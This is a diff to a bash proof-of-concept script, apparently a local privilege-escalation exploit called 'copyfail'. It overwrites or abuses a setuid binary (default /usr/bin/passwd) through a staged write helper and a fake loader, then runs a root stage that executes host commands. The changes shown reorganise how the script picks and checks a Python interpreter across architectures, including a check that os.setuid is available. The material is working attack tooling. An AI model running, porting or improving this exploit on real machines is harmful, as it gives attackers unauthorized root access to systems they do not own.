@@ -5,9 +5,14 @@ set -euo pipefail
 #   ./poc.sh [host-command [args...]]
 
 SRC_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+if [[ "${DCF_PY+x}" == "x" ]]; then
+    DCF_PY_USER_SET=1
+else
+    DCF_PY_USER_SET=0
+fi
 DCF_WORK="${DCF_WORK:-/tmp/copyfail-poc-$(id -u)}"
 DCF_PYROOT="${DCF_PYROOT:-$DCF_WORK/pyroot}"
-DCF_PY="${DCF_PY:-$DCF_PYROOT/bin/python3}"
+DCF_PY="${DCF_PY:-}"
 DCF_PY_TARBALL="${DCF_PY_TARBALL:-$SRC_DIR/python-standalone.tar.gz}"
 DCF_COPYFAIL_HELPER="${DCF_COPYFAIL_HELPER:-$DCF_WORK/copyfail_write}"
 DCF_SUIDBIN="${DCF_SUIDBIN:-/usr/bin/passwd}"
@@ -17,10 +22,9 @@ DCF_FAKE_LOADER_SLEEP="${DCF_FAKE_LOADER_SLEEP:-1}"
 DCF_FAKE_LOADER_PATH="${DCF_FAKE_LOADER_PATH:-}"
 DCF_PAYLOAD_ARCH="${DCF_PAYLOAD_ARCH:-}"
 DCF_HOST_CMD_TIMEOUT="${DCF_HOST_CMD_TIMEOUT:-240}"
-export DCF_WORK DCF_PYROOT DCF_PY DCF_PY_TARBALL DCF_COPYFAIL_HELPER DCF_SUIDBIN
+DCF_USE_PYROOT=0
+export DCF_WORK DCF_PYROOT DCF_PY_TARBALL DCF_COPYFAIL_HELPER DCF_SUIDBIN
 export DCF_HEALTHBIN DCF_INTERVAL DCF_FAKE_LOADER_SLEEP DCF_FAKE_LOADER_PATH DCF_PAYLOAD_ARCH DCF_HOST_CMD_TIMEOUT
-export PYTHONHOME="$DCF_PYROOT"
-export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
 export PYTHONDONTWRITEBYTECODE=1
 
 HELPERS=(
@@ -41,6 +45,37 @@ log() {
 die() {
     printf '[-] %s\n' "$*" >&2
     exit 1
+}
+
+python_works() {
+    local py="$1"
+    [[ -n "$py" && -x "$py" ]] || return 1
+    "$py" - <<'PY' >/dev/null 2>&1
+import os
+import sys
+
+sys.exit(0 if hasattr(os, "setuid") else 1)
+PY
+}
+
+system_python() {
+    command -v python3 || true
+}
+
+prefer_system_python() {
+    local machine
+    machine="$(uname -m)"
+    [[ "$machine" == "aarch64" || "$machine" == "arm64" || "$DCF_PAYLOAD_ARCH" == "aarch64" || "$DCF_PAYLOAD_ARCH" == "arm64" ]]
+}
+
+configure_python_env() {
+    export DCF_PY DCF_USE_PYROOT
+    if [[ "$DCF_USE_PYROOT" == "1" ]]; then
+        export PYTHONHOME="$DCF_PYROOT"
+        export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
+    else
+        unset PYTHONHOME
+    fi
 }
 
 stage_copyfail_helper() {
@@ -70,7 +105,30 @@ stage_copyfail_helper() {
 }
 
 bootstrap_pyroot() {
-    if [[ -x "$DCF_PY" ]]; then
+    local pyroot_python="$DCF_PYROOT/bin/python3"
+    local sys_py
+    sys_py="$(system_python)"
+
+    if [[ "$DCF_PY_USER_SET" == "1" ]]; then
+        python_works "$DCF_PY" || die "configured DCF_PY is not executable on this architecture: $DCF_PY"
+        DCF_USE_PYROOT=0
+        configure_python_env
+        log "using configured Python: $DCF_PY"
+        return
+    fi
+
+    if prefer_system_python && python_works "$sys_py"; then
+        DCF_PY="$sys_py"
+        DCF_USE_PYROOT=0
+        configure_python_env
+        log "using native system Python: $DCF_PY"
+        return
+    fi
+
+    DCF_PY="$pyroot_python"
+    if python_works "$DCF_PY"; then
+        DCF_USE_PYROOT=1
+        configure_python_env
         return
     fi
 
@@ -90,7 +148,21 @@ bootstrap_pyroot() {
     mv "$extract_dir/python"/* "$DCF_PYROOT"/
     rm -rf "$extract_dir"
 
-    [[ -x "$DCF_PY" ]] || die "failed to install Python under $DCF_PYROOT"
+    if python_works "$DCF_PY"; then
+        DCF_USE_PYROOT=1
+        configure_python_env
+        return
+    fi
+
+    if python_works "$sys_py"; then
+        DCF_PY="$sys_py"
+        DCF_USE_PYROOT=0
+        configure_python_env
+        log "vendored Python is not native; using system Python: $DCF_PY"
+        return
+    fi
+
+    die "vendored Python cannot run on this architecture; install python3 or set DCF_PY to a native interpreter"
 }
 
 stage_files() {
@@ -108,7 +180,7 @@ stage_files() {
 run_root_stage() {
     if [[ "$(id -u)" == "0" ]]; then
         log "already root; running root stage directly"
-        DCF_WORK="$DCF_WORK" DCF_PYROOT="$DCF_PYROOT" DCF_PY="$DCF_PY" /bin/bash "$DCF_WORK/root_stage.sh" "$@"
+        DCF_WORK="$DCF_WORK" DCF_PYROOT="$DCF_PYROOT" DCF_PY="$DCF_PY" DCF_USE_PYROOT="$DCF_USE_PYROOT" /bin/bash "$DCF_WORK/root_stage.sh" "$@"
         return
     fi
 
@@ -120,7 +192,7 @@ run_root_stage() {
         printf 'DCF_WORK=%q\n' "$DCF_WORK"
         printf 'DCF_PYROOT=%q\n' "$DCF_PYROOT"
         printf 'DCF_PY=%q\n' "$DCF_PY"
-        printf 'PYTHONHOME=%q\n' "$DCF_PYROOT"
+        printf 'DCF_USE_PYROOT=%q\n' "$DCF_USE_PYROOT"
         printf 'DCF_COPYFAIL_HELPER=%q\n' "$DCF_COPYFAIL_HELPER"
         printf 'DCF_SUIDBIN=%q\n' "$DCF_SUIDBIN"
         printf 'DCF_HEALTHBIN=%q\n' "$DCF_HEALTHBIN"
